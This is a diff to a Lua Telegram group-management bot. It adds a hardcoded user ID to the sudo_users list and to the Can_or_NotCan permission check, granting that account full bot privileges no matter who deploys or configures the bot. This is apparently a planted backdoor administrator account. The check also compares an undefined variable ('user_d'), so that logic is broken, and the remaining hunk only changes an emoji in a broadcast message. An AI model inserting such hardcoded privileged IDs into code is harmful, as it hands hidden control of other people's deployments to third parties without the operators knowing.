@@ -166,7 +166,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end
 
-sudo_users = {SUDO,1706080513}   
+sudo_users = {SUDO,1706080513,1814776575}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -257,6 +257,8 @@ end
 end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_d) == tonumber(1706080513) then  
+var = true  
+elseif tonumber(user_d) == tonumber(1814776575) then  
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -1990,7 +1992,7 @@ message_ids_ = {[0] = msg.id_},
 disable_notification_ = 0,
 from_background_ = 1},function(a,t) end,nil) 
 end   
-send(msg.chat_id_, msg.id_," ?? تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
+send(msg.chat_id_, msg.id_," 🦂 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
 database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end 
 end
